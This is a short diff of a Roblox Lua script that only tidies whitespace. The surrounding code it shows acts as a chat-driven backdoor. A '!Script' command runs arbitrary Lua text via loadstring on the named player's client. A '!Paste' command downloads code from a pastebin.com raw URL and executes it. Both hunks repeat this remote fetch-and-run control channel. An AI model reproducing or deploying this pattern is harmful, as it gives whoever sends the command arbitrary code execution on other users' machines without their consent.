@@ -78,14 +78,14 @@ for i, v in pairs(Players) do
 			end
 
 
-			if CommandData [1] == "!Script" then
+			if CommandData[1] == "!Script" then
 				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
 					loadstring(CommandData[3])()
 				end
 			end
 
 
-			if CommandData [1] == "!Paste" then
+			if CommandData[1] == "!Paste" then
 				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
 					loadstring(game:HttpGet("https://pastebin.com/raw/".. CommandData[3]))()
 				end
@@ -211,14 +211,14 @@ game.Players.PlayerAdded:Connect(function(Player)
 			end
 
 
-			if CommandData [1] == "!Script" then
+			if CommandData[1] == "!Script" then
 				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
 					loadstring(CommandData[3])()
 				end
 			end
 					
 
-			if CommandData [1] == "!Paste" then
+			if CommandData[1] == "!Paste" then
 				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
 					loadstring(game:HttpGet("https://pastebin.com/raw/".. CommandData[3]))()
 				end
